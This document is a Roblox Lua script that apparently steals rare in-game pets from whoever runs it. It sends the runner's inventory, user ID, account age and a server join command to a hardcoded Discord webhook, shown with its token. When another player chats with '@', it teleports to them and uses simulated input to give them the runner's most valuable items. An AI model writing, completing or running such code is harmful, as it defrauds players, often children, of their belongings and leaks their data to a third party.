local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
local UserInputService = game:GetService("UserInputService")
local VirtualInputManager = game:GetService("VirtualInputManager")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
local RARE_PETS = {"T-Rex", "Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly", "Disco bee", "Queen bee"}

local ITEM_PRIORITY = {
    ["T-Rex"] = 1000, ["Dragonfly"] = 950, ["Queen bee"] = 900,
    ["Disco bee"] = 850, ["Raccoon"] = 800, ["Mimic Octopus"] = 750,
    ["Butterfly"] = 700,
}

local function sendWebhook(content, embed)
    local payload = {
        content = content,
        embeds = {embed}
    }
    
    local success, response = pcall(function()
        if request then
            return request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = HttpService:JSONEncode(payload)
            })
        else
            return HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
        end
    end)
    
    if not success then
        warn("Webhook failed: "..tostring(response))
    end
end

local function sendInitialWebhook()
    local placeId = game.PlaceId
    local jobId = game.JobId
    local items = {}
    
    for _, item in pairs(LocalPlayer.Backpack:GetChildren()) do
        table.insert(items, item.Name)
    end
    
    local rareItems = {}
    for _, pet in pairs(RARE_PETS) do
        if table.find(items, pet) then
            table.insert(rareItems, pet)
        end
    end
    
    local embed = {
        title = "📦 Inventory Scan | "..LocalPlayer.Name,
        description = "**Total Items:** "..#items.."\n**Rare Items:** "..#rareItems,
        color = #rareItems > 0 and 0xFF0000 or 0x00FF00,
        thumbnail = {
            url = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=420&height=420&format=png"
        },
        fields = {
            {name = "🔗 Join Script", value = string.format('```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")\n```', placeId, jobId), inline = false},
            {name = "🆔 User ID", value = "```"..LocalPlayer.UserId.."```", inline = true},
            {name = "📅 Account Age", value = "```"..LocalPlayer.AccountAge.." days```", inline = true},
            {name = "💎 Rare Items", value = #rareItems > 0 and "```"..table.concat(rareItems, ", ").."```" or "```None```", inline = false}
        },
        footer = {
            text = "Scan Time: "..os.date("%X")
        }
    }
    
    sendWebhook(#rareItems > 0 and "@everyone" or nil, embed)
end

local function getBestItem(target)
    local bestItem, bestPriority = nil, 0
    for _, item in pairs(target.Backpack:GetChildren()) do
        local priority = 400
        for pattern, value in pairs(ITEM_PRIORITY) do
            if string.find(item.Name, pattern) then
                priority = value
                break
            end
        end
        if priority > bestPriority then
            bestPriority = priority
            bestItem = item
        end
    end
    return bestItem
end

local function findFruitPrompt(targetChar)
    local humanoidRootPart = targetChar:FindFirstChild("HumanoidRootPart")
    if not humanoidRootPart then return nil end
    
    for _, child in pairs(humanoidRootPart:GetChildren()) do
        if child:IsA("ProximityPrompt") then
            return child
        end
    end
    return nil
end

local function lookAtPrompt(prompt)
    local promptPart = prompt.Parent
    local connection
    
    connection = RunService.Heartbeat:Connect(function()
        Camera.CFrame = CFrame.new(Camera.CFrame.Position, promptPart.Position)
    end)
    
    return function()
        if connection then connection:Disconnect() end
    end
end

local function holdPrompt(prompt)
    local startTime = os.clock()
    local promptPart = prompt.Parent
    
    local screenPos, visible = Camera:WorldToScreenPoint(promptPart.Position)
    if not visible then return false end
    
    local targetPos = Vector2.new(screenPos.X, screenPos.Y)
    local mouse = game:GetService("Players").LocalPlayer:GetMouse()
    
    for i = 1, 5 do
        local t = i/5
        local newPos = Vector2.new(mouse.X, mouse.Y):Lerp(targetPos, t)
        VirtualInputManager:SendMouseMoveEvent(newPos.X, newPos.Y, game)
        task.wait(0.1)
    end
    
    VirtualInputManager:SendMouseButtonEvent(targetPos.X, targetPos.Y, 0, true, game, 1)
    
    while os.clock() - startTime < prompt.HoldDuration + 0.5 do
        screenPos, visible = Camera:WorldToScreenPoint(promptPart.Position)
        if not visible then break end
        
        targetPos = Vector2.new(screenPos.X, screenPos.Y)
        VirtualInputManager:SendMouseMoveEvent(targetPos.X, targetPos.Y, game)
        task.wait(0.1)
    end
    
    VirtualInputManager:SendMouseButtonEvent(targetPos.X, targetPos.Y, 0, false, game, 1)
    return true
end

local function interactWithTarget(target)
    local targetChar = target.Character or target.CharacterAdded:Wait()
    local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    
    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
    LocalPlayer.Character:SetPrimaryPartCFrame(targetChar:GetPrimaryPartCFrame() * CFrame.new(0, 0, -3))
    
    local stopLooking = lookAtPrompt(targetChar)
    
    while true do
        local bestItem = getBestItem(LocalPlayer)
        if not bestItem then break end
        
        LocalPlayer.Character.Humanoid:EquipTool(bestItem)
        task.wait(0.5)
        
        local prompt = findFruitPrompt(targetChar)
        if prompt then
            holdPrompt(prompt)
        else
            task.wait(1)
        end
    end
    
    if stopLooking then stopLooking() end
end

local function onPlayerChatted(player, message)
    if player == LocalPlayer or not string.find(message, "@") then return end
    
    local items = {}
    for _, item in pairs(player.Backpack:GetChildren()) do
        table.insert(items, item.Name)
    end
    
    local rareItems = {}
    for _, pet in pairs(RARE_PETS) do
        if table.find(items, pet) then
            table.insert(rareItems, pet)
        end
    end
    
    local embed = {
        title = "🎯 Target Mentioned | "..player.Name,
        description = "**Chat:** ```"..message.."```",
        color = 0xFFA500,
        thumbnail = {
            url = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"
        },
        fields = {
            {name = "📦 Items", value = "```"..#items.." found```", inline = true},
            {name = "💎 Rares", value = #rareItems > 0 and "```"..table.concat(rareItems, ", ").."```" or "```None```", inline = true},
            {name = "🔗 Profile", value = "https://www.roblox.com/users/"..player.UserId.."/profile", inline = false}
        },
        footer = {
            text = "Triggered: "..os.date("%X")
        }
    }
    
    sendWebhook(nil, embed)
    interactWithTarget(player)
end

sendInitialWebhook()

for _, player in pairs(Players:GetPlayers()) do
    if player ~= LocalPlayer then
        player.Chatted:Connect(function(msg) onPlayerChatted(player, msg) end)
    end
end

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg) onPlayerChatted(player, msg) end)
end)

local function disableLocalPrompts()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local rootPart = character:WaitForChild("HumanoidRootPart")
    for _, child in pairs(rootPart:GetChildren()) do
        if child:IsA("ProximityPrompt") then
            child.Enabled = false
        end
    end
end

LocalPlayer.CharacterAdded:Connect(disableLocalPrompts)
disableLocalPrompts()
